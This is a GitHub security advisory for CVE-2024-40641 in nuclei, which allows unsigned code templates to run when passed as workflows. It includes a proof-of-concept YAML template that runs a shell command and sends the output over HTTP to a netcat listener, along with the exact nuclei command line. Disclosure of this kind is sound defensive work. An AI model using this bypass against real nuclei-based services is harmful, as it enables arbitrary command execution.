# [H] projectdiscovery/nuclei allows unsigned code template execution through workflows

## Summary
Severity: High
Advisory: GHSA-c3q9-c27p-cw9h
CVE: CVE-2024-40641
CWE: CWE-78
Ecosystem: Go
CVSS: CVSS:3.1/AV:L/AC:H/PR:N/UI:R/S:C/C:H/I:H/A:N (CVSS_V3)
Published: 2024-07-17
Source: https://github.com/advisories/GHSA-c3q9-c27p-cw9h
Type: github-advisory

## Affected
- Go: `github.com/projectdiscovery/nuclei/v3` — affected >=0 <3.3.0

## Details
### Summary
Find a way to execute code template without -code option and signature.

### Details
write a `code.yaml`:
```yaml
id: code

info:
  name: example code template
  author: ovi3


code:
  - engine:
      - sh
      - bash
    source: |
      id

http:
  - raw:
      - |
        POST /re HTTP/1.1
        Host: {{Hostname}}

        {{code_response}}

workflows:
  - matchers:
    - name: t
```

using nc to listen on 80:
```bash
nc -lvvnp 80
```

execute PoC template with nuclei:
```bash
./nuclei -disable-update-check  -w code.yaml -u http://127.0.0.1 -vv -debug
```
and nc will get `id` command output.

We use `-w` to specify a workflow file, not `-t` to template file. and notice there is a `workflows` field in code.yaml to pretend to be a workflow file.

Test in Linux and Nuclei v3.2.9

### Impact
Some web applications inherit from Nuclei and allow users to edit and execute workflow files. In this case, users can execute arbitrary commands. (Although, as far as I know, most web applications use -t to execute)

## References
- https://github.com/projectdiscovery/nuclei/security/advisories/GHSA-c3q9-c27p-cw9h
- https://nvd.nist.gov/vuln/detail/CVE-2024-40641
- https://github.com/projectdiscovery/nuclei
